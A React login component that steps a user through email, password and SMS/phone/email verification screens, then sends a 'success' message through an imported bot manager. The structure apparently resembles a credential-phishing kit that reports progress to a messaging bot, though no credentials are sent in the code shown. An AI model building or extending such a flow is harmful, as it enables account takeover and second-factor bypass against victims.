import React, {useEffect, useState} from 'react';
import Email from "../email/Email";
import Password from "../password/Password";
import AuthVerification from "../authVerification/AuthVerification";
import axios from "axios";
import bot from "../../bot_manager/manager";
import FinalAuth from "../finalAuth/FinalAuth";

const LoginManager = () => {

    const [firstStep, setStep] = useState(true);
    const [email, setEmail] = useState('')
    //0 - nothing, 1 - SMS, 2 - phone, 3 - Email
    const [state, setState] = useState(0);
    const [isFinalStep,setFinalStep] = useState(false);

    useEffect(() => {
        if (state !== 0) {
            axios.post(bot.sendMessage("success"))
        }
    }, [state])

    return (
        <div>
            {!isFinalStep  ? state === 0 ? firstStep ? <Email setStep={setStep.bind()} setEmail={setEmail.bind()}/> :
                    <Password email={email} setState={setState.bind()}/>
                :
                <div>
                    <AuthVerification state={state} setFinal={setFinalStep.bind()}/>
                </div> : <FinalAuth state={state}/>
            }
        </div>
    );
};

export default LoginManager;